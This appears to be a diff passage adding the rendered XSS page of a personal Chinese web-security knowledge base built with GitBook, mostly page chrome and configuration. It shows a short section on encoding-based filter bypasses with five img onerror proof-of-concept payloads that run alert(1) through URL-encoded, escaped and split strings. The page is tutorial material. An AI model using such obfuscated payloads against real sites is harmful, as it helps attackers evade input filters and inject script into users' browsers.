+<span class="token comment">&lt;!--&#x9996;&#x5148;&#x7ECF;&#x8FC7;HTML&#x89E3;&#x6790;&#xFF0C;&#x56E0;&#x4E3A;href&#x4F1A;&#x6D89;&#x53CA;&#x5230;URL&#x6240;&#x4EE5;&#x4F1A;&#x5148;&#x8FDB;&#x884C;URL&#x89E3;&#x6790;&#xFF0C;
+&#x5C06;%61lert%281%29&#x89E3;&#x6790;&#x4E3A;alert(1)&#x6700;&#x540E;&#x518D;&#x7ECF;&#x8FC7;JS&#x89E3;&#x6790;&#x5668;&#x6210;&#x529F;&#x89E3;&#x6790;alert(1)
+URL &#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x7EC6;&#x8282;&#x4E86;&#xFF0C;&#x4E0D;&#x80FD;&#x5BF9;&#x534F;&#x8BAE;&#x7C7B;&#x578B;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x7684;&#x7F16;&#x7801;&#x64CD;&#x4F5C;&#xFF0C;&#x5426;&#x5219;URL&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x8BA4;&#x4E3A;&#x5B83;&#x65E0;&#x7C7B;&#x578B;--&gt;</span>
+</code></pre>
+<h3 id="&#x53CC;&#x5199;"><a name="&#x53CC;&#x5199;" class="anchor-navigation-ex-anchor" href="#&#x53CC;&#x5199;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.3. &#x53CC;&#x5199;</h3>
+<h3 id="&#x5927;&#x5C0F;&#x5199;"><a name="&#x5927;&#x5C0F;&#x5199;" class="anchor-navigation-ex-anchor" href="#&#x5927;&#x5C0F;&#x5199;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.4. &#x5927;&#x5C0F;&#x5199;</h3>
+<h3 id="&#x4E00;&#x4E9B;&#x6848;&#x4F8B;"><a name="&#x4E00;&#x4E9B;&#x6848;&#x4F8B;" class="anchor-navigation-ex-anchor" href="#&#x4E00;&#x4E9B;&#x6848;&#x4F8B;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.5. &#x4E00;&#x4E9B;&#x6848;&#x4F8B;</h3>
+<pre class="language-"><code class="lang-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>location=<span class="token punctuation">&apos;</span>javascript:alert(1)<span class="token punctuation">&apos;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>location=<span class="token punctuation">&apos;</span>javascript:%61lert%281%29<span class="token punctuation">&apos;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>location=<span class="token punctuation">&apos;</span>j\x61vascript:%61lert%281%29<span class="token punctuation">&apos;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>loc\u0061tion=<span class="token punctuation">&apos;</span>j\x61vascript:%61lert%281%29<span class="token punctuation">&apos;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>loc\u0061tion=<span class="token punctuation">&apos;</span>java<span class="token punctuation">&apos;</span>+<span class="token punctuation">&apos;</span>scri<span class="token punctuation">&apos;</span>+<span class="token punctuation">&apos;</span>pt:<span class="token punctuation">&apos;</span>+<span class="token punctuation">&apos;</span>ale<span class="token punctuation">&apos;</span>+<span class="token punctuation">&apos;</span>rt%281%29<span class="token punctuation">&apos;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<h2 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;"><a name="&#x53C2;&#x8003;&#x94FE;&#x63A5;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;"><i class="fa fa-link" aria-hidden="true"></i></a>1.7. &#x53C2;&#x8003;&#x94FE;&#x63A5;</h2>
+<p><a href="https://www.runoob.com/jsref/dom-obj-event.html" target="_blank">https://www.runoob.com/jsref/dom-obj-event.html</a>
+<a href="https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&amp;mid=2247483698&amp;idx=1&amp;sn=cebb6e5c01f4e6a72860f13c5e5ea4f5&amp;chksm=eaad810fddda08195f9afdfd4ead758bc3de3a1aa5bc71b169d2599383b51b431218ac19142d&amp;scene=21#wechat_redirect" target="_blank">XSS&#xFF08;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#xFF09;&#x8BE6;&#x89E3;</a></p>
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; aaron 2023 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2023-05-19 14:14:12
+</span></footer>
+
+<pre class="language-"><code class="lang-html">Author: aaron
+Url: https://byaaronluo.github.io/&#x77E5;&#x8BC6;&#x5E93;/01.WEB&#x5B89;&#x5168;/02.XSS/
+Source: aaron &#x77E5;&#x8BC6;&#x5E93;
+This article was originally published in&#x300C;aaron &#x77E5;&#x8BC6;&#x5E93;&#x300D;,Reproduced please indicate the source, thank you for cooperation!
+</code></pre>
+</body></html>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../01.SQLi/ThinkPHP_3.2.3_SQLi.html" class="navigation navigation-prev " aria-label="Previous page: ThinkPHP_3.2.3_SQLi">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../03.CSRF/" class="navigation navigation-next " aria-label="Next page: 03.CSRF">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"02.XSS","level":"1.2.2","depth":2,"next":{"title":"03.CSRF","level":"1.2.3","depth":2,"path":"知识库/01.WEB安全/03.CSRF/README.md","ref":"知识库/01.WEB安全/03.CSRF/README.md","articles":[{"title":"CSRF绕过Referer技巧","level":"1.2.3.1","depth":3,"path":"知识库/01.WEB安全/03.CSRF/CSRF绕过Referer技巧.md","ref":"知识库/01.WEB安全/03.CSRF/CSRF绕过Referer技巧.md","articles":[]}]},"previous":{"title":"ThinkPHP_3.2.3_SQLi","level":"1.2.1.6","depth":3,"path":"知识库/01.WEB安全/01.SQLi/ThinkPHP_3.2.3_SQLi.md","ref":"知识库/01.WEB安全/01.SQLi/ThinkPHP_3.2.3_SQLi.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","chapter-fold","expandable-chapters","splitter","page-treeview","lightbox","donate","hide-element","code","tbfed-pagefooter","pageview-count","ancre-navigation","anchor-navigation-ex","insert-logo","favicon","github","flexible-alerts","prism","copyright","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright &copy aaron 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"page-treeview":{"collapsed":false,"copyright":"Copyright &#169; aaron","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript","shell":"bash","xml-dtd":"xml"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack"]},"github":{"url":"https://github.com/byAaronLuo/"},"livereload":{},"splitter":{},"copyright":{"copyProtect":true,"site":"https://byaaronluo.github.io/","author":"aaron","website":"aaron 知识库","image":""},"code":{"copyButtons":true},"donate":{"alipay":"/README.assets/alipay.jpeg","alipayText":"支付宝打赏","button":"打赏☕️","title":"","wechat":"/README.assets/wx.jpeg","wechatText":"微信打赏"},"hide-element":{"elements":[".gitbook-link",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"favicon":{"shortcut":"/README.assets/favicon.ico","bookmark":"/README.assets/favicon.ico","appleTouch":"/README.assets/favicon.ico","appleTouchMore":{"120x120":"/README.assets/favicon.ico","180x180":"/README.assets/favicon.ico"}},"lightbox":{"jquery":true,"sameUuid":false},"pageview-count":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"insert-logo":{"style":"background: none; max-height: 50px; min-height: 50px;border-radius:50%","url":"/README.assets/logo.png"},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"aaron","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Aaron 知识库","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"知识库/01.WEB安全/02.XSS/README.md","mtime":"2023-05-19T06:14:12.475Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-05-19T08:28:01.480Z"},"basePath":"../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../../gitbook/gitbook.js"></script>
+    <script src="../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-plus/search.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-insert-logo/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-copyright/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
